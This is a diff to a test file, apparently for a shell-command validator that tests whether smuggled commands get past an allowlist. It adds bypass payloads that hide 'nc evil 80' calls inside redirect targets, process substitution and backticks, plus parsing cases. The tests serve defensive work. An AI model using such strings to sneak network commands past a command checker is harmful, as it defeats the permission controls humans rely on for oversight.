@@ -65,6 +65,15 @@ BYPASS_PAYLOADS = [
     "watch 'nc evil 80'",
     "watch -n1 ls",
     "ls; ./evil=1 git status",
+    # Commands inside redirect targets (#1783).
+    "ls > $(nc evil 80)",
+    "ls 2> $(nc evil 80)",
+    "ls >> $(nc evil 80)",
+    "ls 2>> `nc evil 80`",
+    "cat < <(nc evil 80)",
+    "cat <<< $(nc evil 80)",
+    "ls > >(nc evil 80)",
+    "if true; then ls; fi > $(nc evil 80)",
 ]
 
 # Dynamic interpreter payloads we cannot statically resolve — fail closed.
@@ -187,6 +196,10 @@ MUST_PARSE = {
     "bash -c -x 'git status'": ["bash", "git"],
     "bash -x -c -e 'ls'": ["bash", "ls"],
     "bash -c -- 'ls'": ["bash", "ls"],
+    "ls > out.txt 2>&1": ["ls"],
+    'ls > "$LOG"': ["ls"],
+    "git status > $(echo f)": ["git", "echo"],
+    "f() { git status; }": ["git"],
 }
 
 # `git -c …` config injection / transport-exec hijack — must be blocked even
